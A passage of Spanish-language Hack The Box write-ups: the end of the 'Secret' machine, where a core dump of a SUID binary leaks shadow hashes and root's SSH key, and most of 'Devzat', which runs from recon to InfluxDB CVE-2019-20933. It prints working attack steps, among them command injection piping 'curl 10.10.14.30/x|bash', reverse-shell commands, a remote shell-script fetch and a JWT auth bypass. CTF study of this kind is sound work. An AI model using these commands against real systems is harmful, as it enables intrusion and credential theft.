lines = 0; while ((ch = fgetc(file)) != EOF) { characters++; if (ch == \u0026#39;\\n\u0026#39; || ch == \u0026#39;\\0\u0026#39;) lines++; if (ch == \u0026#39; \u0026#39; || ch == \u0026#39;\\t\u0026#39; || ch == \u0026#39;\\n\u0026#39; || ch == \u0026#39;\\0\u0026#39;) words++; } if (characters \u0026gt; 0) { words++; lines++; } snprintf(summary, 256, \u0026#34;Total characters = %d\\nTotal words = %d\\nTotal lines = %d\\n\u0026#34;, characters, words, lines); printf(\u0026#34;\\n%s\u0026#34;, summary); } int main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(\u0026#34;Enter source file/directory name: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); getchar(); stat(path, \u0026amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\u0026#34;Save results a file? [y/N]: \u0026#34;); res = getchar(); if (res == 121 || res == 89) { printf(\u0026#34;Path: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); FILE *fp = fopen(path, \u0026#34;a\u0026#34;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(\u0026#34;Could not open %s for writing\\n\u0026#34;, path); } } return 0; } Observamos dos comentarios en el codigo, uno para \u0026ldquo;limitar la escritura de ficheros\u0026rdquo; (setuid(getuid())) y otro para el \u0026lsquo;coredump generation\u0026rsquo; (prctl(PR_SET_DUMPABLE, 1)) o un volcado de memoria, este último no es más que un registro de memoria de un proceso en un momento especifico, con ello es posible ver toda la informacion: variables, datos, etc., en este caso el archivo que es abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 int main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(\u0026#34;Enter source file/directory name: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); getchar(); stat(path, \u0026amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\u0026#34;Save results a file? [y/N]: \u0026#34;); res = getchar(); if (res == 121 || res == 89) { printf(\u0026#34;Path: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); FILE *fp = fopen(path, \u0026#34;a\u0026#34;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(\u0026#34;Could not open %s for writing\\n\u0026#34;, path); } } return 0; } Coredump Vemos que en ubuntu los coredumps se generan en el directorio /var/crash, tambien, encontramos como generar un coredump utilizando kill -ABRT \u0026lt;pid\u0026gt; ya que estos \u0026lsquo;coredump\u0026rsquo; se generan cuando el sistema detecta algo anormal en un proceso, finalmente para la lectura de los archivos .crash es posible mediante la herramienta apport-unpack (1).\nPara poder generar un coredump necesitamos dos terminales, una que ejecute el fichero count y otra que mata el proceso, seguramente cuando pregunte por la salida del resultado. Si observamos, en la segunda pestaña encontramos el pid y lo matamos, al revisar la carpeta /var/crash vemos el coredump generado.\nbash\rbash\r1 2 3 4 5 6 7 8 dasith@secret:~$ /opt/count Enter source file/directory name: /etc/shadow Total characters = 1187 Total words = 36 Total lines = 36 Save results a file? [y/N]: y Path: Aborted (core dumped) dasith@secret:~$ 1 2 3 4 5 6 7 8 9 10 11 12 13 dasith@secret:~$ ps -ef|grep count root 838 1 0 01:15 ? 00:00:00 /usr/lib/accountsservice/accounts-daemon dasith 1707 1632 0 06:22 pts/0 00:00:00 /opt/count dasith 1709 1692 0 06:22 ? 00:00:00 grep --color=auto count dasith@secret:~$ kill -ABRT 1707 dasith@secret:~$ ls -lah /var/crash total 92K drwxrwxrwt 2 root root 4.0K Nov 22 06:23 . drwxr-xr-x 14 root root 4.0K Aug 13 05:12 .. -rw-r----- 1 root root 27K Oct 6 18:01 _opt_count.0.crash -rw-r----- 1 dasith dasith 29K Nov 22 06:23 _opt_count.1000.crash -rw-r----- 1 root root 24K Oct 5 14:24 _opt_countzz.0.crash dasith@secret:~$ Con apport-unpack obtuvimos distintos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 dasith@secret:/var/crash$ mkdir /tmp/dump dasith@secret:/var/crash$ ls _opt_count.1000.crash dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/dump dasith@secret:/var/crash$ cd /tmp/dump dasith@secret:/var/crash$ ls Architecture CoreDump Date DistroRelease ExecutablePath ExecutableTimestamp ProblemType ProcCmdline ProcCwd ProcEnviron ProcMaps ProcStatus Signal Uname UserGroups dasith@secret:/tmp/dump$ Si bien los archivos son utilizados para ser depurados, al pasar un strings en el archivo CoreDump vemos el contenido del archivo que hemos pasado anteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 dasith@secret:/tmp/dump$ strings CoreDump [.. snip ..] ?????????? Total entries = %d Regular files = %d Directories = %d Symbolic links = %d Unable to open file. Please check if file exists and you have read privilege. Total characters = %d Total words = %d Total lines = %d Enter source file/directory name: %99s Save results a file? [y/N]: Path: Could not open %s for writing :*3$\u0026#34; Path: esults a file? [y/N]: l words = 36 Total lines = 36 tc/shadow root:$6$/0f5J.S8.u.dA78h$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7::: daemon:*:18659:0:99999:7::: bin:*:18659:0:99999:7::: sys:*:18659:0:99999:7::: sync:*:18659:0:99999:7::: [.. snip ..] sshd:*:18852:0:99999:7::: systemd-coredump:!!:18852:::::: dasith:$6$RM7seX/Mzkds2S1x$.vkOBt4kRfs/6JRApNqvzZ1zM6W1FK8kNKyoBOVSuZbrdlOw.vPj2D7VC0y0sz2Eg2z5rj.GdK2ApMBFynjmR/:18873:0:99999:7::: lxd:!:18852:::::: mongodb:!:18852:0:99999:7::: aliases ethers group [.. snip ..] dasith@secret:/tmp/dump$ Shell Si realizamos lo mismo, pero esta vez con el archivo id_rsa de root, obtendriamos acceso a la clave privada SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 dasith@secret:/tmp/dump$ cd /tmp/dump [.. snip ..] Total entries = %d Regular files = %d Directories = %d Symbolic links = %d Unable to open file. Please check if file exists and you have read privilege. Total characters = %d Total words = %d Total lines = %d Enter source file/directory name: %99s Save results a file? [y/N]: Path: Could not open %s for writing :*3$\u0026#34; Path: esults a file? [y/N]: l words = 45 Total lines = 39 oot/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3 KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+ 7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1 xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx [.. snip ..] RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9 6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA== -----END OPENSSH PRIVATE KEY----- aliases ethers [.. snip ..] .eh_frame_hdr .eh_frame .text .altinstructions .altinstr_replacement .comment dasith@secret:/tmp/dump$ Tras utilizar la clave privada por ssh logramos obtener acceso como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~/htb/secret ❯ ssh -i root root@10.10.11.120 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 22 Nov 2021 06:47:47 AM UTC System load: 0.08 Processes: 221 Usage of /: 52.5% of 8.79GB Users logged in: 0 Memory usage: 18% IPv4 address for eth0: 10.10.11.120 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Tue Oct 26 15:13:55 2021 root@secret:~# whoami; id root uid=0(root) gid=0(root) groups=0(root) root@secret:~# ls root.txt snap root@secret:~# cat root.txt bd2691571f51dd767375165b2afb4f2f root@secret:~# ","description":"En Secret obtuvimos acceso por medio de una API, tras analizar el codigo fuente logramos escalar privilegios y acceder tras realizar 'Command Injection'. Escalamos privilegios tras generar un 'CoreDump' que nos permitió acceder por SSH.","id":32,"section":"posts","tags":["command injection","jwt","coredump","crashdump","suid"],"title":"Hack The Box - Secret","uri":"https://sckull.github.io/posts/secret/"},{"content":"\rDevzat presenta un sitio web donde identificamos una vulnerabilidad de \u0026lsquo;Command Injection\u0026rsquo;, tambien, se expone el chat Devzat por SSH donde obtuvimos información acerca de la base de datos y la versión en Desarrollo del chat. Explotamos una vulnerabilidad en InfluxDB lo que nos permitió acceder a un segundo usuario. Finalmente escalamos privilegios analizando el codigo fuente de la version en Desarrollo, lo que nos permitió realizar la lectura de archivos como root y obtener acceso por SSH.\nNombre Devzat OS Linux Puntos 30 Dificultad Media IP 10.10.11.118 Maker c1sc0\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.5, 4.9, 5.1, 4.9, 5.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra los puertos http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.91 scan initiated Sat Oct 16 20:00:33 2021 as: nmap -p22,80 -sC -sV -o nmap_scan 10.10.11.118 Nmap scan report for devzat.htb (10.10.11.118) Host is up (0.096s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: devzat - where the devs at Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Oct 16 20:00:43 2021 -- 1 IP address (1 host up) scanned in 10.34 seconds Web Site El puerto 80 nos redirige hacia un dominio principal: devzat.htb, el cual agregamos a /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/devzat ❯ curl -s 10.10.11.118 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://devzat.htb/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.118 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; π ~/htb/devzat ❯ curl -sI 10.10.11.118 HTTP/1.1 302 Found Date: Sat, 16 Oct 2021 22:50:00 GMT Server: Apache/2.4.41 (Ubuntu) Location: http://devzat.htb/ Content-Type: text/html; charset=iso-8859-1 π ~/htb/devzat ❯ En el sitio web presentan un chat accesible por medio de SSH.\nVemos las instrucciones donde se muestra el puerto 80 en la conexion de ssh y con la flag -l para agregar un nombre de usuario.\nFinalmente en el footer vemos un nombre de usuario como correo electronico.\nDirectory Brute Forcing feroxbuster no mostró ningun otro directorio o pagina donde sacar informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 π ~/htb/devzat ❯ feroxbuster -u http://devzat.htb/ -w $MD ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://devzat.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 309c http://devzat.htb/images 301 9l 28w 309c http://devzat.htb/assets 301 9l 28w 313c http://devzat.htb/assets/css 301 9l 28w 313c http://devzat.htb/javascript 301 9l 28w 312c http://devzat.htb/assets/js 403 9l 28w 275c http://devzat.htb/server-status [####################] - 12m 226537/226537 0s found:6 errors:1186 [####################] - 12m 220545/220545 291/s http://devzat.htb/ [\u0026gt;-------------------] - 40s 1576/220545 39/s http://devzat.htb/images [\u0026gt;-------------------] - 38s 1971/220545 53/s http://devzat.htb/assets [\u0026gt;-------------------] - 29s 936/220545 35/s http://devzat.htb/assets/css [\u0026gt;-------------------] - 25s 510/220545 23/s http://devzat.htb/javascript [\u0026gt;-------------------] - 26s 999/220545 46/s http://devzat.htb/assets/js π ~/htb/devzat ❯ Devzat Chat Al intentar conectarnos al chat con el nombre patrick este no lo acepta, pero si cambiamos una de las letras a mayusculas, éste nos permite ingresar, vemos el \u0026ldquo;historial\u0026rdquo; del chat de patrick donde se menciona una base de datos: influxdb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/devzat ❯ ssh -l patrick devzat.htb -p 8000 Nickname reserved for local use, please choose a different one. \u0026gt; patrick Nickname reserved for local use, please choose a different one. \u0026gt; Patrick admin: Hey patrick, you there? patrick: Sure, shoot boss! admin: So I setup the influxdb for you as we discussed earlier in business meeting. patrick: Cool 👍 admin: Be sure to check it out and see if it works for you, will ya? patrick: Yes, sure. Am on it! devbot: admin has left the chat Welcome to the chat. There are no more users devbot: Patrick has joined the chat Patrick: Subdominios Al no encontrar algun tipo de vulnerablidad en devzat enumeramos los subdominios utilizando ffuf. Vemos el subdominmio pets.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/devzat ❯ ffuf -w bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.devzat.htb\u0026#34; -u http://devzat.htb -fw 18 -o ffuf_report.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://devzat.htb :: Wordlist : FUZZ: bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.devzat.htb :: Output file : ffuf_report.txt :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 18 ________________________________________________ pets [Status: 200, Size: 510, Words: 20, Lines: 21] :: Progress: [100000/100000] :: Job [1/1] :: 326 req/sec :: Duration: [0:07:03] :: Errors: 0 :: User - Patrick En este subdomino encontramos una pagina con una lista de mascotas, especie y caracteristica de cada una de ellas.\nPor debajo de la lista encontramos un formulario para agregar una nueva mascota, sin embargo tras ingresar un valor y recargar la pagina este, desaparece.\nVemos en el codigo fuente el directorio /build/ donde encontramos el archivo main.js.map, este ultimo contiene el codigo fuente y en el vemos una solicitud POST hacia una API.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { onMount } from \u0026#39;svelte\u0026#39;; let animals = []; let postAnimal = { name: \u0026#39;\u0026#39;, species: \u0026#39;cat\u0026#39; }; onMount(async () =\u0026gt; { // fetch animals const res = await fetch(`/api/pet`); animals = await res.json(); }); async function doPost() { // add the new animal await fetch(`/api/pet`, { method: \u0026#39;POST\u0026#39;, body: JSON.stringify(postAnimal), }).then(async (res) =\u0026gt; { if (res.status == 200) { // reload animals const update = await fetch(`/api/pet`); animals = await update.json(); // Clear form postAnimal = { name: \u0026#39;\u0026#39; }; } }).catch((err) =\u0026gt; alert(err)); } API - Command Injection Utilizando burpsuite capturamos la solicitud POST, jugando con los parametros de envio logramos realizar Command Injection en el parametro species, donde vemos que el usuario que ejecuta la aplicacion es Patrick.\nShell Utilizamos reverse-shell de la version de InfosecJack (no disponible, alternativa shells) para generar un archivo con multiples shells inversas , tambien ejecutamos un mini servidor con python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/devzat/www ❯ wget -q https://shell.infosecjack.me/10.10.14.30:1338 -O x π ~/htb/devzat/www ❯ head x # Reverse Shell as a Service # https://github.com/SewellDinG/reverse-shell # 1. On your machine: # nc -l 1337 # # 2. On the target machine: # curl https://shell.infosecjack.me/yourip:1337 | sh # # 3. Don\u0026#39;t be a dick (please only use for CTFs) π ~/htb/devzat/www ❯ httphere . Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Ejecutamos netcat en el puerto especificado anteriormente y ejecutamos el archivo enviando el comando.\n1 2 3 4 { \u0026#34;name\u0026#34;:\u0026#34;scatman\u0026#34;, \u0026#34;species\u0026#34;:\u0026#34;cat|curl 10.10.14.30/x|bash\u0026#34; } Logrando obtener una shell inversa con el usuario Patrick.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/devzat ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.30] from devzat.htb [10.10.11.118] 60598 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; patrick@devzat:~/pets$ id; whoami; pwd uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) patrick /home/patrick/pets patrick@devzat:~/pets$ En la carpeta .ssh/ encontramos la clave privada de patrick que nos permite ingresar por SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/devzat ❯ ssh patrick@devzat.htb -i id_rsa_patrick Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 19 Oct 2021 03:08:50 AM UTC System load: 0.0 Processes: 241 Usage of /: 58.9% of 7.81GB Users logged in: 0 Memory usage: 22% IPv4 address for docker0: 172.17.0.1 Swap usage: 0% IPv4 address for eth0: 10.10.11.118 107 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Tue Jun 22 19:48:41 2021 from 192.168.50.1 patrick@devzat:~$ pwd /home/patrick patrick@devzat:~$ User - Catherine Encontramos multiples puertos abiertos localmente, si recordamos, el usuario admin menciona influxdb, segun la documentacion el puerto 8086 es el puerto por default del servicio HTTP, el cual se lista al ejecutar netstat.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 patrick@devzat:~$ netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN 846/./petshop tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8086 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::8000 :::* LISTEN 904/./devchat tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - patrick@devzat:~$ Tambien, enumerando los usuarios vemos dos archivos \u0026ldquo;backup\u0026rdquo; a los que solo catherine puede acceder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 patrick@devzat:~$ cat /etc/passwd|grep home syslog:x:104:110::/home/syslog:/usr/sbin/nologin patrick:x:1000:1000:patrick:/home/patrick:/bin/bash catherine:x:1001:1001:catherine,,,:/home/catherine:/bin/bash patrick@devzat:~$ find / -user catherine 2\u0026gt;/dev/null /home/catherine /home/catherine/.profile /home/catherine/.cache /home/catherine/.bashrc /home/catherine/.ssh /home/catherine/user.txt /home/catherine/.bash_logout /var/backups/devzat-main.zip /var/backups/devzat-dev.zip patrick@devzat:~$ cat /home/catherine/user.txt cat: /home/catherine/user.txt: Permission denied patrick@devzat:~$ ls -lah /var/backups/ total 140K drwxr-xr-x 2 root root 4.0K Sep 29 16:25 . drwxr-xr-x 14 root root 4.0K Jun 22 18:34 .. -rw-r--r-- 1 root root 58K Sep 28 18:45 apt.extended_states.0 -rw-r--r-- 1 root root 6.5K Sep 21 20:17 apt.extended_states.1.gz -rw-r--r-- 1 root root 6.5K Jul 16 06:41 apt.extended_states.2.gz -rw------- 1 catherine catherine 28K Jul 16 07:00 devzat-dev.zip -rw------- 1 catherine catherine 27K Jul 16 07:00 devzat-main.zip patrick@devzat:~$ Además, en el chat devzat se menciona un feature implementado en la version de desarrollo que se encuentra en el puerto 8443, mencionado por Patrick, tambien se menciona el codigo fuente en el backup, seguramente devzat-dev.zip.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/devzat ❯ ssh -l Catherine devzat.htb -p 8000 patrick: Hey Catherine, glad you came. catherine: Hey bud, what are you up to? patrick: Remember the cool new feature we talked about the other day? catherine: Sure patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443. catherine: Kinda busy right now 👔 patrick: That\u0026#39;s perfectly fine 👍 You\u0026#39;ll need a password I gave you last time. catherine: k patrick: I left the source for your review in backups. catherine: Fine. As soon as the boss let me off the leash I will check it out. patrick: Cool. I am very curious what you think of it. See ya! devbot: patrick has left the chat Welcome to the chat. There are no more users devbot: Catherine has joined the chat Catherine: Devzat Local Chat Al conectarnos localmente a la version de desarrollo, encontramos el chat similar al puerto 8000, pero en este se menciona la version de infuxdb que es: 1.7.5.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 patrick@devzat:~$ ssh 127.0.0.1 -p 8443 The authenticity of host \u0026#39;[127.0.0.1]:8443 ([127.0.0.1]:8443)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;[127.0.0.1]:8443\u0026#39; (ED25519) to the list of known hosts. admin: Hey patrick, you there? patrick: Sure, shoot boss! admin: So I setup the influxdb 1.7.5 for you as we discussed earlier in business meeting. patrick: Cool 👍 admin: Be sure to check it out and see if it works for you, will ya? patrick: Yes, sure. Am on it! devbot: admin has left the chat Welcome to the chat. There are no more users devbot: patrick has joined the chat patrick: exit patrick: /exit Connection to 127.0.0.1 closed. El chat de catherine muestra informacion similar al puerto 8000, vemos el comando diff main dev que podria mostrar los cambios realizados en la versio en desarrollo y la principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Catherine patrick@devzat:~$ ssh -l Catherine 127.0.0.1 -p 8443 patrick: Hey Catherine, glad you came. catherine: Hey bud, what are you up to? patrick: Remember the cool new feature we talked about the other day? catherine: Sure patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443. catherine: Kinda busy right now 👔 patrick: That\u0026#39;s perfectly fine 👍 You\u0026#39;ll need a password which you can gather from the source. I left it in our default backups location. catherine: k patrick: I also put the main so you could `diff main dev` if you want. catherine: Fine. As soon as the boss let me off the leash I will check it out. patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya! devbot: patrick has left the chat Welcome to the chat. There are no more users devbot: Catherine has joined the chat Catherine: InfluxDB La version de InfluxDB se ve afectada por un exploit (CVE-2019-20933) que realiza bypass a la autenticacion mediante la creacion de un token JWT. Este exploit utiliza un wordlist de usuarios, conocemos tres.\n1 2 3 4 π InfluxDB-Exploit-CVE-2019-20933 master ✗ ❯ cat user.txt catherine patrick admin Principalmente utilizamos SSH para realizar Port Forwarding al puerto 8086.\n1 ssh -L 8086:127.0.0.1:8086 -i id_rsa_patrick patrick@devzat.htb Tras instalar las dependencias del script en un entorno virtual, y modificar variables, lanzamos el script, donde encontramos dos bases de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 (InfluxDB-Exploit-CVE-2019-20933) π InfluxDB-Exploit-CVE-2019-20933 master ✗ ❯ python3 __main__.py _____ __ _ _____ ____ ______ _ _ _ |_ _| / _| | | __ \\| _ \\ | ____| | | (_) | | | _ __ | |_| |_ ___ __ | | | |_) | | |__ __ ___ __ | | ___ _| |_ | | | \u0026#39;_ \\| _| | | | \\ \\/ / | | | _ \u0026lt; | __| \\ \\/ / \u0026#39;_ \\| |/ _ \\| | __| _| |_| | | | | | | |_| |\u0026gt; \u0026lt;| |__| | |_) | | |____ \u0026gt; \u0026lt;| |_) | | (_) | | |_ |_____|_| |_|_| |_|\\__,_/_/\\_\\_____/|____/ |______/_/\\_\\ .__/|_|\\___/|_|\\__| | | |_| CVE-2019-20933 Start username bruteforce [x] catherine [x] patrick [v] admin Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MDc3Njc5LjB9.YB5NpsE5RyQfESS_xwfqVusMH5B57ZlgxHgZTnd2iOk Host vulnerable !!! Databases list: 1) devzat 2) _internal Enumerando las series vemos user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Insert database name (exit to close): devzat [devzat] Insert query (exit to change db): show series { \u0026#34;results\u0026#34;: [ { \u0026#34;series\u0026#34;: [ { \u0026#34;columns\u0026#34;: [ \u0026#34;key\u0026#34; ], \u0026#34;values\u0026#34;: [ [ \u0026#34;user\u0026#34; ] ] } ], \u0026#34;statement_id\u0026#34;: 0 } ] } Al extraer la informacion de user encontramos multiples credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 [devzat] Insert query (exit to change db): SELECT * FROM 